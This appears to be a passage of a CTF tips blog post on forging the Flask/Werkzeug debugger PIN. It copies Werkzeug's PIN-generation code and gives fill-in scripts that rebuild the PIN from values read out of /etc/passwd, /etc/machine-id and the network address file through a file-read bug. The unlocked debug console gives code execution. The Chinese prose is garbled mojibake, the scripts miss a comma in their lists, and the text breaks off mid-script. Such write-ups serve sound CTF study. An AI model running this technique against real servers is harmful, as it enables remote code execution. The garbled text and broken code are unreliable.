<p>phpcms 9.6.0</p>
<p><strong>479</strong></p>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/eaf7f5df.html">CTFshowå¸¸ç”¨å§¿åŠ¿</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-06-12</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/eaf7f5df.html" data-flag-title="CTFshowå¸¸ç”¨å§¿åŠ¿"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p><strong>801</strong></p>

        <h3 id="flaskè®¡ç®—PIN"   >
          <a href="#flaskè®¡ç®—PIN" class="heading-link"><i class="fas fa-link"></i></a><a href="#flaskè®¡ç®—PIN" class="headerlink" title="flaskè®¡ç®—PIN"></a>flaskè®¡ç®—PIN</h3>
      <p><strong>ä»€ä¹ˆæ˜¯PINç </strong></p>
<p>PINç ä¹Ÿå°±æ˜¯flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼</p>
<p><strong>æ³¨æ„äº‹é¡¹ï¼šè°¨è®°ï¼ï¼python 3.8ï¼ˆmd5ï¼‰å’Œ3.6ï¼ˆsha1ï¼‰pinç ç”Ÿæˆæ–¹å¼ä¸åŒ</strong></p>
<p><strong>ä½¿ç”¨æ¡ä»¶ï¼šflask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</strong></p>
<p>é¦–å…ˆæ˜¯python PINç çš„ç”Ÿæˆè„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç”Ÿæ•ˆæ—¶é—´ä¸ºä¸€å‘¨</span>
PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span>


<span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string"> added salt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>


_machine_id<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>

<span class="token comment">#è·å–æœºå™¨å·</span>
<span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> _machine_id

    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> _machine_id

    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        linux <span class="token operator">=</span> <span class="token string">b""</span>

        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">if</span> value<span class="token punctuation">:</span>
            <span class="token comment">#è¯»å–æ–‡ä»¶è¿›è¡Œæ‹¼æ¥</span>
                linux <span class="token operator">+=</span> value
                <span class="token keyword">break</span>

        <span class="token comment"># Containers share the same machine id, add some cgroup</span>
        <span class="token comment"># information. This is used outside containers too but should be</span>
        <span class="token comment"># relatively stable across boots.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            <span class="token comment">#ç»§ç»­è¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œå¤„ç†ä¸€ä¸‹åªè¦/dockeråçš„ä¸œè¥¿</span>
                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>
            <span class="token keyword">return</span> linux

        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>
            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>
            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE

            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>
                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE
            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>
        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>
            <span class="token keyword">import</span> winreg

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>
                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>
                    <span class="token number">0</span><span class="token punctuation">,</span>
                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>
                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>
                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>
                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>
                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>

                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>
                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>

                    <span class="token keyword">return</span> guid
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

        <span class="token keyword">return</span> <span class="token boolean">None</span>

    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> _machine_id


<span class="token keyword">class</span> <span class="token class-name">_ConsoleFrame</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Helper class so that we can reuse the frame console code for the
    standalone console.
    """</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> namespace<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span>namespace<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
    rv <span class="token operator">=</span> <span class="token boolean">None</span>
    num <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token comment"># Pin was explicitly disabled</span>
    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>

    <span class="token comment"># Pin was provided explicitly</span>
    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># If there are separators in the pin, return it directly</span>
        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
            rv <span class="token operator">=</span> pin
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> pin

    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>
        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>
        <span class="token comment"># have a username, such as in Docker.</span>
        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> <span class="token boolean">None</span>

    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

    <span class="token comment"># This information only exists to make the cookie unique on the</span>
    <span class="token comment"># computer, not as a security feature.</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        username<span class="token punctuation">,</span>
        modname<span class="token punctuation">,</span>
        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>

    <span class="token comment"># This information is here to make it harder for an attacker to</span>
    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>
    <span class="token comment"># within the unauthenticated debug page.</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
    <span class="token comment"># end up with the same value and generate out 9 digits</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
    <span class="token comment"># we don't have a result yet.</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”±ä¸Šå¯ä»¥çœ‹å¾—å‡ºPINå€¼ç”Ÿæˆæ‰€éœ€è¦è·å–çš„æ•°æ®æœ‰</p>
<ul>
<li>usernameï¼Œç”¨æˆ·å</li>
<li>modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app</li>
<li>appnameï¼Œé»˜è®¤å€¼ä¸ºFlask</li>
<li>moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</li>
<li>uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°</li>
<li>machine_idï¼Œdockeræœºå™¨idæˆ–æœ¬æœºid</li>
</ul>
<p>é¦–å…ˆæ˜¯ç”¨æˆ·å</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png"></p>
<p>å¯ç”¨çš„ä¼¼ä¹åªæœ‰root</p>
<p>ä¸‹é¢ä¸‰é¡¹ä»»æ„æŠ¥é”™å³å¯è·å¾—</p>
<p>macåœ°å€</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png"></p>
<p>Machine_id</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png"></p>
<p>æœ¬æœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
     <span class="token string">'flaskweb'</span><span class="token comment"># username</span>
     <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>
     <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
          <span class="token keyword">break</span>
       <span class="token keyword">else</span><span class="token punctuation">:</span>
          rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span><span class="token comment"># /etc/passwd</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># é»˜è®¤å€¼</span>
    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># æŠ¥é”™å¾—åˆ°</span>
<span class="token punctuation">]</span>

